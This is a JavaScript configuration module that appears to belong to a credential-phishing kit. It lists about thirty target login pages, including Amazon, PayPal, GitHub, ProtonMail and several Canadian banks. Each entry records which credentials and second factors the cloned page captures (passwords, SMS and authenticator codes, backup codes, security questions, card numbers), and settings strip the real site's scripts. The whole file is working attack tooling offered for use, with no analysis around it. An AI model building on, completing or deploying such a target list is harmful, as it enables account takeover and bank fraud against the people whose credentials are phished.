const spikeModules = {
    adobe: {
        description: "username | password | authentication devices | email code | sms code | resend code | authenticator app.",
        url: {
            desktop: "https://account.adobe.com/",
        },
        removeAllJs: true,
        baseURI: "https://auth.services.adobe.com",
    },
    airtel: {
        description: "phone | sms code | resend code.",
        url: {
            desktop: "https://www.airtel.in/manage-account/login",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    ajio: {
        description: "phone | sms code | resend code.",
        url: {
            desktop: "https://www.ajio.com/login",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    amazon: {
        description: "phone | email | password | sms code | resend code | authentication device | forget password.",
        url: {
            desktop: "https://www.amazon.com/gp/sign-in.html"
        },
        removeAllJs: true,
        // baseURI: "",
    },
    amazon_prime: {
        description: "phone | email | password | sms code | resend code | authentication device | forget password.",
        url: {
            desktop: "https://www.primevideo.com/signup",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    deviantart: {
        description: "username | password.",
        url: {
            desktop: "https://www.deviantart.com/users/login",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    discord: {
        description: "email | password | code.",
        url: {
            desktop: "https://discord.com/login",
        },
        removeAllJs: true,
        baseURI: "https://discord.com",
    },
    facebook: {
        description: "email | password | sms code.",
        url: {
            desktop: "https://www.facebook.com/",
            phone: "https://m.facebook.com/"
        },
        removeAllJs: true,
    },
    github: {
        description: "email | password | sms code | resend code.",
        url: {
            desktop: "https://github.com/login",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    google: {
        description: "waiting for google's new ui.",
        url: {
            desktop: "https://accounts.google.com",
        },
        removeAllJs: true,
        ua: "Chrome",
        // baseURI: "",
    },
    godaddy: {
        description: "email | password - only.",
        url: {
            desktop: "https://sso.godaddy.com/"
        },
        removeAllJs: true,
        ua: "Chrome",
        // baseURI: "",
    },
    hackerone: {
        description: "email | password | auth code.",
        url: {
            desktop: "https://hackerone.com/users/sign_in",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    instagram: {
        description: "username | password | sms code | resend code | backup codes.",
        url: {
            desktop: "https://www.instagram.com/",
        },
        removeAllJs: true,
        baseURI: "/web_public/instagram",
    },
    linkedin: {
        description: "email | password | sms code | resend code.",
        url: {
            desktop: "https://www.linkedin.com/",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    mediafire: {
        description: "email | password.",
        url: {
            desktop: "https://www.mediafire.com/login/",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    mega: {
        description: "email | password | auth code.",
        url: {
            desktop: "https://mega.nz/login",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    microsoft: {
        description: "*, i'm not sure.",
        url: {
            desktop: "https://login.microsoftonline.com",
        },
        removeAllJs: true,
        grabCSS: true,
        // baseURI: "",
    },
    netflix: {
        description: "email | password.",
        url: {
            desktop: "https://www.netflix.com/login",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    originpc: {
        description: "email | password.",
        url: {
            desktop: "https://www.originpc.com/account/login/",
        },
        removeAllJs: true,
        baseURI: "https://www.originpc.com",
    },
    paypal: {
        description: "email | password | auth code.",
        url: {
            desktop: "https://www.paypal.com/signin",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    protonmail: {
        description: "email | password | auth code | backup codes.",
        url: {
            desktop: "https://account.proton.me/mail",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    whatsapp: {
        description: "scan qrcode.",
        url: {
            desktop: "https://web.whatsapp.com/",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    rbc: {
        description: "Client Card | Password | Security Questions.",
        url: {
            desktop: "https://www.rbcroyalbank.com/personal.html",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    td: {
        description: "Access Card | Password | Security Questions.",
        url: {
            desktop: "https://easyweb.td.com/",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    bmo: {
        description: "Client Card | Password | Security Questions.",
        url: {
            desktop: "https://www.bmo.com/main/personal",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    scotiabank: {
        description: "Username | Password | Security Questions.",
        url: {
            desktop: "https://www.scotiabank.com/ca/en/personal.html",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    cibc: {
        description: "Card Number | Password | Security Questions.",
        url: {
            desktop: "https://www.cibc.com/en/personal-banking.html",
        },
        removeAllJs: true,
        // baseURI: "",
    },
    nationalbank: {
        description: "Username | Password | Security Questions.",
        url: {
            desktop: "https://www.nbc.ca/",
        },
        removeAllJs: true,
        // baseURI: "",
    }
};

const sortedKeys = Object.keys(spikeModules).sort();
const sortedObject = {};
sortedKeys.forEach(key => {
    sortedObject[key] = spikeModules[key];
});

module.exports = {
    spikeModules: sortedObject,
    checkSpikeModule(appName) {
        return spikeModules[appName];
    },
    getAppUrl(appName, device) {
        const url = spikeModules[appName]["url"][device];
        if (url == undefined) {
            return spikeModules[appName]["url"]["desktop"];
        }
        return url;
    }
};
